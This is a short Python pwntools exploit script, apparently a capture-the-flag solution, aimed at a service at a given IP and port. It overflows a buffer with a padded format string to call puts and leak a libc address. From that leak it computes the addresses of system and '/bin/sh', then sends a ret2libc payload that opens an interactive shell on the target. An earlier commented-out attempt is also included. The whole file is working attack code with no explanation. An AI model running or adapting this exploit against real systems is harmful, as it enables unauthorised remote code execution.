from pwn import *
"""
payload=""
payload+="%50dAAAABBBBCCCCDD"
payload+=p32(0xdeadbeef)

p=remote("40.89.172.98",1337)
p.sendline(payload)
p.interactive()

"""
puts_plt=0x080483a0
vuln=0x08048506
start_libc_got=0x0804a014

p=remote("40.89.172.98",1337)
#p=process("./task")
payload=""
payload+="%80d"
payload+=p32(puts_plt)
payload+=p32(vuln)
payload+=p32(start_libc_got)
p.sendline(payload)

data=p.recvline()[:-9]

leak=u32(data)

base=leak-0x018d90
system=base+0x03cd10
binsh=base+0x17b8cf
print "base :",hex(base)
print "system :",hex(system)
print "binsh :",hex(binsh)


payload=""
payload+="%80d"
payload+=p32(system)
payload+="JUNK"
payload+=p32(binsh)
payload+=p32(0x00)

p.sendline(payload)
p.interactive()
# %80d
